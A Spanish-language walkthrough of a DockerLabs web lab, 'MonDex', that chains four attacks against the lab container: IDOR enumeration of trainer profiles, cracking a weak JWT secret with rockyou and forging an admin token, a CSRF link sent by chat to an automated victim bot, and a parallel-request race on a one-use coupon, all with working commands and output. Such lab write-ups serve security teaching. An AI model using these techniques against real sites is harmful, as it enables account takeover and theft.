# Pokedex — MonDex

**Dificultad:** Medio (guiada)
**Categoría:** Web

MonDex es una red social / "dex" para entrenadores que capturan y coleccionan criaturas.
La máquina encadena **cuatro fallos web** de principio a fin: un **IDOR de lectura** para
enumerar entrenadores, un **JWT HS256 con secreto débil** que permite forjarse como
administrador, un **CSRF** (POST que también acepta GET, sin token anti-CSRF) que una
**víctima automatizada** del chat dispara con su propia sesión, y una **race condition
(TOCTOU)** en el canje de un cupón "de un solo uso". No hay escalada a root del contenedor:
el compromiso termina al convertirse en administrador de MonDex.

## Objetivo

1. Reconocer la aplicación y sus rutas internas.
2. Enumerar entrenadores abusando del IDOR (`/api/entrenador?id=`).
3. Crackear el secreto del JWT y forjarse un token con rol `admin`.
4. Robar la criatura legendaria de la víctima mediante CSRF enviado por el chat.
5. Explotar la race condition del cupón para volver shiny toda la colección.

## Tipo de máquina

- **Plataforma:** Docker (DockerLabs), un único contenedor.
- **SO:** Debian.
- **Categoría:** Web.
- **Stack:** Node.js + Express sirviendo un frontend propio (HTML/CSS/JS plano). Estado en
  memoria. La víctima automatizada (el Campeón *Lance*) corre como un `setInterval` dentro
  del mismo proceso Node.
- **Servicio:** HTTP en el puerto **3500**.

## Instalación

Descomprimir el ZIP y desplegar con el script oficial:

```bash
unzip pokedex.zip
cd pokedex
chmod +x auto_deploy.sh
./auto_deploy.sh pokedex.tar
```

El script hace `docker load` de la imagen y `docker run` del contenedor. Se accede por la
**IP del contenedor** (sin publicar puertos). En esta prueba la IP fue `172.17.0.2`.

## Escaneo de puertos

```bash
nmap -sV -p- 172.17.0.2
```

```
PORT     STATE SERVICE VERSION
3500/tcp open  http    Node.js Express framework
```

Un único servicio: un servidor Node/Express en el 3500. Todo el juego es web.

## Enumeración

### Recon de la web

La aplicación es **MonDex**. Desde la landing nos registramos como entrenador (recibimos un
lote de criaturas de inicio). El HTML y el JS del frontend son legibles y van dejando pistas.
Lo primero, `robots.txt`:

```bash
curl -s http://172.17.0.2:3500/robots.txt
```

```
# MonDex — rutas internas (no indexar)
User-agent: *
Disallow: /perfil
Disallow: /transferir
Disallow: /canjear-cupon
Disallow: /admin
Disallow: /api/entrenador
```

Nos lista las rutas interesantes: perfil, transferir, canjear cupón, admin y la API de
entrenadores.

### Registro

```bash
curl -s -c cookies.txt -X POST http://172.17.0.2:3500/api/registro \
  -H 'Content-Type: application/json' \
  -d '{"user":"ash","email":"ash@mondex.dl","password":"123456"}'
```

```
{"ok":true,"id":5,"user":"ash"}
```

Nos asigna el **id 5**. El servidor responde con una cookie `token` (un JWT) **sin
`HttpOnly`** y con `SameSite=Lax` (importante más adelante para el CSRF).

## Escalada a usuario — IDOR + JWT

### Vulnerabilidad 1 — IDOR de lectura (`/api/entrenador?id=`)

La página de perfil carga los datos desde `/api/entrenador?id=<n>`. El servidor exige
sesión válida, pero **devuelve el perfil del `id` pedido sin comprobar que sea el tuyo**.
Cambiando el número enumeramos a todos los entrenadores:

```bash
for i in 1 2 3 4; do
  curl -s -b cookies.txt "http://172.17.0.2:3500/api/entrenador?id=$i" \
    | grep -o '"user":"[^"]*"\|"role":"[^"]*"\|"legendaria":true'
done
```

```
"user":"profesor_oak" "role":"admin"
"user":"lance" "role":"trainer" "legendaria":true
"user":"misty" "role":"trainer"
"user":"brock" "role":"trainer"
```

Dos descubrimientos clave:

- El **id 1** (`profesor_oak`) tiene **rol `admin`**: existe un administrador al que aspirar.
- El **id 2** (`lance`) posee una criatura **legendaria** (la veremos luego: *Dracovern*).
  Será la víctima del CSRF.

Perfil completo del campeón (ojo a su `bio`, que es otra pista):

```bash
curl -s -b cookies.txt "http://172.17.0.2:3500/api/entrenador?id=2"
```

```json
{"id":2,"user":"lance","email":"lance@mondex.dl","role":"trainer","region":"Cumbre Dracón",
"bio":"Campeón de la Liga MonDex. Suele abrir los enlaces que le mandan por el chat.",
"coleccion":[{"id":2,"especie":"Dracovern","tipo":"dragón","shiny":false,"legendaria":true},
{"id":3,"especie":"Petrón","tipo":"roca","shiny":false,"legendaria":false},
{"id":4,"especie":"Marevella","tipo":"agua","shiny":false,"legendaria":false}]}
```

La legendaria es la criatura **id 2** (*Dracovern*), propiedad del entrenador **id 2**.

### Vulnerabilidad 2 — JWT HS256 con secreto débil

La cookie de sesión es un JWT. Al no tener `HttpOnly`, se lee directo del navegador
(`document.cookie`) o se recupera de la petición de login:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjUsInVzZXIiOiJhc2giLCJyb2xlIjoidHJhaW5lci
IsImlhdCI6MTc5NDQxNTI4MSwiZXhwIjoxNzk1MDIwMDgxfQ._tk2ZRP2TqZbi-SQ7Iep_qTG5aC4qIF54sz19ZGpza4
```

El payload (segundo segmento, base64url) es:

```json
{"sub":5,"user":"ash","role":"trainer","iat":1794415281,"exp":1795020081}
```

Es **HS256** y la autorización de `/admin/*` depende solo de que `role === "admin"` y de que
la **firma sea válida**. No hay sesión en servidor, así que si crackeamos el secreto podemos
reforjar el token. El secreto es una palabra presente en **rockyou.txt**.

La vía clásica es `jwt2john` + John the Ripper:

```bash
python3 /usr/share/john/jwt2john.py <token> > jwt.hash
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.hash
john --show jwt.hash
```

Comprobación real del secreto con un único proceso sobre rockyou (HMAC-SHA256 por diccionario):

```bash
perl -MDigest::SHA=hmac_sha256 -MMIME::Base64 -e '
  my $jwt = do { open my $f,"<","jwt.txt"; local $/; my $t=<$f>; $t=~s/\s//g; $t };
  my ($h,$p,$s)=split /\./,$jwt; my $signing="$h.$p";
  my $b=$s; $b=~tr{-_}{+/}; $b.="=" x ((4-length($b)%4)%4);
  my $sig=decode_base64($b);
  open my $w,"<","rockyou.txt"; my $n=0;
  while(my $word=<$w>){ $n++; chomp $word;
    if(hmac_sha256($signing,$word) eq $sig){ print "ENCONTRADO linea $n: secreto = $word\n"; exit 0 } }
  print "no encontrado\n";'
```

```
ENCONTRADO linea 1284: secreto = pikachu
```

El secreto es **`pikachu`** (línea 1284 de rockyou, muy por debajo de las 5000).

### Forjar el token de administrador

Con el secreto, reforjamos un token con `user`/`role` = `admin` (en un examen se hace en
**jwt.io**: se edita el payload y se firma con `pikachu`). Equivalente por consola:

```bash
b64url(){ openssl base64 -A | tr '+/' '-_' | tr -d '='; }
H=$(printf '{"alg":"HS256","typ":"JWT"}' | b64url)
P=$(printf '{"sub":1,"user":"admin","role":"admin"}' | b64url)
SIG=$(printf '%s' "$H.$P" | openssl dgst -sha256 -hmac 'pikachu' -binary | b64url)
echo "$H.$P.$SIG"
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.k4s-b0IPruY63DMIOD-RhWXhyxyeXeqjI6mk7V1l6tQ
```

Reemplazamos la cookie `token` por este valor (en el navegador, o con `Cookie:` en curl) y
ya somos administradores. El panel de admin lista a todos los entrenadores con id, correo y rol:

```bash
curl -s -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.k4s-b0IPruY63DMIOD-RhWXhyxyeXeqjI6mk7V1l6tQ" \
  http://172.17.0.2:3500/api/admin/entrenadores
```

```json
[{"id":1,"user":"profesor_oak","email":"oak@mondex.dl","role":"admin","region":"Pueblo Lazo"},
 {"id":2,"user":"lance","email":"lance@mondex.dl","role":"trainer","region":"Cumbre Dracón"},
 {"id":3,"user":"misty","email":"misty@mondex.dl","role":"trainer","region":"Ciudad Celeste"},
 {"id":4,"user":"brock","email":"brock@mondex.dl","role":"trainer","region":"Ciudad Plomiza"},
 {"id":5,"user":"ash","email":"ash@mondex.dl","role":"trainer","region":"Pueblo Lazo"}]
```

Con el token de trainer original la misma ruta devuelve `{"error":"Solo administradores."}`:
la diferencia es exclusivamente el `role` del JWT reforjado.

## Escalada de privilegios — CSRF + Race condition

Ya somos admin de MonDex. Los dos últimos vectores demuestran el impacto completo: robar la
legendaria de la víctima y romper la lógica del cupón.

### Vulnerabilidad 3 — CSRF por el chat (víctima automatizada)

La acción de **regalar/transferir** una criatura se envía a `/transferir` con los parámetros
`id` (entrenador **origen**, el que entrega), `destino` (quién la recibe) y `criatura`. Tiene
dos problemas combinados:

1. **No hay token anti-CSRF.**
2. El endpoint **también acepta GET** con los mismos parámetros (mutación por GET).

El servidor sí exige que el `id` origen coincida con la sesión que ejecuta la petición, así
que **no podemos transferir la criatura de otro llamando nosotros directamente**. Si lo
intentamos con el id de Lance desde nuestra sesión, nos corta:

```bash
curl -s -b cookies.txt "http://172.17.0.2:3500/transferir?id=2&destino=5&criatura=2"
```

```
{"error":"El entrenador origen debe ser el de tu sesión."}
```

La clave es que la cookie es `SameSite=Lax`: una navegación GET de nivel superior (un clic en
un enlace) **sí envía la cookie** de la víctima. Si conseguimos que **Lance** abra el enlace,
la petición saldrá con **su** sesión (`id` = 2 = su `sub`), pasará el control y la criatura se
transferirá a `destino`. Construimos la URL con el id de *Lance* como origen (id 2), su
legendaria (criatura id 2) y nosotros como destino (id 5):

```
http://172.17.0.2:3500/transferir?id=2&destino=5&criatura=2
```

La enviamos **por el chat** a Lance. El Campeón es una **víctima automatizada**: un bot que
cada pocos segundos revisa su bandeja y abre los enlaces que recibe con su sesión (siempre
contra el propio contenedor, sin salir a hosts externos).

```bash
curl -s -b cookies.txt -X POST http://172.17.0.2:3500/api/mensajes \
  -H 'Content-Type: application/json' \
  -d '{"destino":2,"texto":"Lance mira esto: http://172.17.0.2:3500/transferir?id=2&destino=5&criatura=2"}'
```

```
{"ok":true}
```

A los pocos segundos, nuestra colección (id 5) incluye a *Dracovern*, que antes era de Lance:

```bash
curl -s -b cookies.txt "http://172.17.0.2:3500/api/entrenador?id=5" | grep -o '"especie":"[^"]*"'
```

```
"especie":"Dracovern"
"especie":"Flamú"
"especie":"Hojaraña"
"especie":"Chispeón"
"especie":"Aquétano"
"especie":"Brotijo"
"especie":"Voltizorro"
```

Los logs del contenedor confirman que fue el bot quien disparó la petición con la sesión de
Lance:

```
[bot] Campeón Lance (id 2) vigilando su chat cada 4s...
[bot] Lance abrió /transferir?id=2&destino=5&criatura=2 -> 200
```

### Vulnerabilidad 4 — Race condition / TOCTOU en el cupón

Cada entrenador tiene un cupón "de un solo uso" que convierte **una** criatura en shiny. La
lógica es *comprobar → (espera) → usar*: lee `usado === false`, espera unos segundos y luego
marca una criatura como shiny y pone `usado = true`. Entre la comprobación y la escritura hay
una **ventana** sin bloqueo.

De forma secuencial, el cupón se comporta bien: convierte **una** criatura y rechaza el
segundo intento.

```bash
curl -s -b u2.txt -X POST "http://172.17.0.2:3500/canjear-cupon"
curl -s -b u2.txt -X POST "http://172.17.0.2:3500/canjear-cupon"
```

```
{"ok":true,"criatura":"Flamú","mensaje":"¡Flamú ahora es shiny! ✨"}
{"error":"Este cupón ya fue canjeado."}
```

Pero si lanzamos **varias peticiones en paralelo** (en Burp Repeater sería "Send group in
parallel"; aquí con un bucle), todas leen `usado=false` antes de que ninguna escriba `true` y
cada una convierte una criatura:

```bash
for i in $(seq 1 8); do
  curl -s -b cookies.txt -X POST "http://172.17.0.2:3500/canjear-cupon" &
done; wait
```

```
{"ok":true,"criatura":"Dracovern","mensaje":"¡Dracovern ahora es shiny! ✨"}
{"ok":true,"criatura":"Flamú","mensaje":"¡Flamú ahora es shiny! ✨"}
{"ok":true,"criatura":"Hojaraña","mensaje":"¡Hojaraña ahora es shiny! ✨"}
{"ok":true,"criatura":"Aquétano","mensaje":"¡Aquétano ahora es shiny! ✨"}
{"ok":true,"criatura":"Brotijo","mensaje":"¡Brotijo ahora es shiny! ✨"}
{"ok":true,"criatura":"Chispeón","mensaje":"¡Chispeón ahora es shiny! ✨"}
{"ok":true,"criatura":"Voltizorro","mensaje":"¡Voltizorro ahora es shiny! ✨"}
{"ok":true,"criatura":null,"mensaje":"Ya no quedan criaturas por mejorar."}
```

Con un solo cupón hemos vuelto shiny **toda** la colección:

```bash
curl -s -b cookies.txt "http://172.17.0.2:3500/api/entrenador?id=5" \
  | grep -o '"especie":"[^"]*","tipo":"[^"]*","shiny":[a-z]*'
```

```
"especie":"Dracovern","tipo":"dragón","shiny":true
"especie":"Flamú","tipo":"fuego","shiny":true
"especie":"Hojaraña","tipo":"planta","shiny":true
"especie":"Chispeón","tipo":"eléctrico","shiny":true
"especie":"Aquétano","tipo":"agua","shiny":true
"especie":"Brotijo","tipo":"planta","shiny":true
"especie":"Voltizorro","tipo":"eléctrico","shiny":true
```

## Resumen de la cadena

1. **Recon** → `robots.txt` revela las rutas internas; nos registramos (id 5).
2. **IDOR** (`/api/entrenador?id=`) → enumeramos entrenadores, localizamos al admin (id 1) y
   a la víctima *Lance* (id 2) con su legendaria.
3. **JWT** → crackeamos el secreto (`pikachu`, rockyou línea 1284), forjamos un token
   `role:admin` y entramos al panel de administración.
4. **CSRF** → enviamos por el chat un GET a `/transferir` con el id de Lance como origen; el
   bot lo abre con su sesión y nos transfiere la legendaria.
5. **Race condition** → canjeamos el cupón "de un solo uso" en paralelo y volvemos shiny toda
   la colección.

Fin del compromiso: administrador de MonDex con la legendaria de la víctima y la colección
entera shiny.
